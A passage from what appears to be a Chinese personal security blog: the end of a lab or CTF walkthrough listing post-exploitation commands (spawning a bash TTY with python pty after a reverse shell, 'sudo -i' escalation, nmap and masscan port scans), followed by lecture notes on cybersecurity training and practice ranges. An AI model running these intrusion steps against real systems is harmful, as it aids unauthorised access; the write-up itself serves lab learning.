<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开新终端</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure>

<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05  总结"></a>0x05  总结</h1><ol>
<li><p>习惯查看网页源码以及查看bash下所有文件<strong>ls -la</strong></p>
</li>
<li><p>&amp;&amp;   &amp;    |的妙用</p>
</li>
<li><p>当cat查看某些文件出现乱码时，可以考虑用strings</p>
</li>
<li><p>一般反弹的shell不如终端，一般拿到后都先用python弹一个终端出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&quot;</span>/bin/bash<span class="string">&quot;)&quot;</span></span><br><span class="line">sudo -i</span><br></pre></td></tr></table></figure></li>
<li><p>反弹shell过程</p>
</li>
<li><p>知识点总结：</p>
<ul>
<li><p>Python -m ：mod,run library module  as  a   script</p>
</li>
<li><p>SimpleHTTPServe：use Python SimpleHTTPServer to turn any directory into a simple HTTP web server.</p>
</li>
<li><p>python http服务器运行在80端口</p>
</li>
<li><p>nmap -sn：ping scan</p>
</li>
<li><p>masscan –rate=10000 –ports 0-65535 192.168.127.134：</p>
<p>–rate=10000  意思是10kpps(packet per second)，每秒一万个数据包</p>
</li>
<li><p>wget：非交互式网络文件下载工具</p>
</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/29/%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E8%AE%B2%E5%BA%A7%E6%9C%89%E6%84%9F/" class="post-title-link" itemprop="url">方滨兴院士讲座有感</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-29 09:54:26" itemprop="dateCreated datePublished" datetime="2021-04-29T09:54:26+08:00">2021-04-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-05-03 21:38:39" itemprop="dateModified" datetime="2021-05-03T21:38:39+08:00">2021-05-03</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是六论视觉"><a href="#什么是六论视觉" class="headerlink" title="什么是六论视觉"></a>什么是六论视觉</h1><p>六论视觉：强弱是相对论,知识是认识论(敢闯无人区),失败是实践论,决策是矛盾论(多目标,化解矛盾才是最重要的),发展是进化论,管理是方法论(球不能停在自己脚下)</p>
<p>网络安全人才的培养的六论视觉：能力是相对论,安全是认识论,攻防是实践论,选择是矛盾论,水平是进化论,鉴别是进化论.</p>
<ol>
<li>安全是认识论：<br>超过5000就构成犯罪。所以会用到靶场(类比少林弟子)。</li>
</ol>
<h1 id="人才培养"><a href="#人才培养" class="headerlink" title="人才培养"></a>人才培养</h1><p><strong>技能：知识(西电)+方法(方班)</strong></p>
<ul>
<li><p>知识：事实 常识 规则</p>
</li>
<li><p>方法：思辨 质疑 创新</p>
<p>迅速适应企业的要求，迅速补上知识。自信的提升就是方法的提升。我觉得这么干是对的就是对的。美国一直行走在无人区。也要抬头看看是否真的无人，不怕走无人区，睁大眼睛可能有人做得比我好。</p>
<p>思辨：如小萁所言，把查到得信息变为知识为思辨的过程。需要训练。思辨才是看难文章的敲门砖。你最会什么?你最懂的知道什么？把一件事思辨的搞明白。会思辨之后，再看顶会(挑战难度)。听完之后，迅速提炼自己的问题。保证心里有预期答案。为什么没按。不应该有答案，也是提高。特别坚信他是错的。每次讲完做总结。</p>
</li>
</ul>
<h1 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h1><p>靶场：vulhub  pikachu  raven  sqli-lab</p>
<p>内打内属于靶场(CTF)；内打外属于护网；外打外属于系统测试(方班演武堂)；外打内设备测试(大量人众测)。</p>
<p>军队搞CTF赛很奇葩，每年参加CTF没什么意义(相当于奥赛其实，对于初学者)，为了比赛而比赛不可取，应该参与真正的实战。</p>
<p>没有xss等。看的是逻辑漏洞，整个认证是在前端，认证应该在后端。改了应用程序，只看底层造成的。</p>
<p>不要培养专职的CTF选手。仅限在学校</p>
<h1 id="自我提高"><a href="#自我提高" class="headerlink" title="自我提高"></a>自我提高</h1><p><strong>最牛的要真的牛</strong></p>
<h2 id="状态："><a href="#状态：" class="headerlink" title="状态："></a>状态：</h2><p>有一个做的特别深,便会知道怎么做.</p>
<p>每天激情状态</p>
<p>需要空闲期去考虑自己下一步要做什么，单目标函数还是双目标函数。</p>
<p>喜欢理论支持博士，喜欢实践鼓励创业</p>
<p>先去公司就业，积累资源、人脉，然后去创业。</p>
<h2 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h2><p>靶场–&gt;对应的CTF赛题–&gt;实战、SRC。哪块弱补哪块。</p>
<h2 id="安排："><a href="#安排：" class="headerlink" title="安排："></a>安排：</h2><ol>
<li><strong>对于自己：各种靶场训练，然后实操。</strong></li>
<li><strong>redis–&gt;渗透测试 搞清楚，一步一步来</strong></li>
<li>去拿到各种SRC的证书。</li>
<li>知识积累，突变（量变转质变）web后期一定会是二进制.–横向贯彻(各个方向都要)</li>
<li>未接触领域,善于找标签:岗位体系–&gt;需要什么知识体系–&gt;将自己的标签和他对应上。标签需要很详细到某方面,类似于安全设备配置这样,而不是安全配置.</li>
<li>每天一篇：电子取证领域的论文</li>
</ol>
<h3 id="为何高分低能？"><a href="#为何高分低能？" class="headerlink" title="为何高分低能？"></a>为何高分低能？</h3><p>考试是采样,高分低能就是这样.采样是点,然而交流或者应用是连续.采样题是无聊的,宽泛的,面试其实也是,都是连续交流,其实开卷反而更难.</p>
<p>参考：</p>
<p>认证业务平台:<a target="_blank" rel="noopener" href="http://cstc.cncstea.cn/">http://cstc.cncstea.cn</a></p>
<p><a target="_blank" rel="noopener" href="http://examanage.cncstea.cn/">http://examanage.cncstea.cn</a></p>
<p>​    </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="swanQ"
      src="/images/author.jpg">
  <p class="site-author-name" itemprop="name">swanQ</p>
  <div class="site-description" itemprop="description">Try & Enjoy</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">22</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">49</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    聊天
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="mailto:zhuoma.swanq@foxmail.com" title="E-Mail → mailto:zhuoma.swanq@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">swanQ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">74k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:07</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script size="300" alpha="0.6" zIndex="-1" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/',]
      });
      });
  </script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
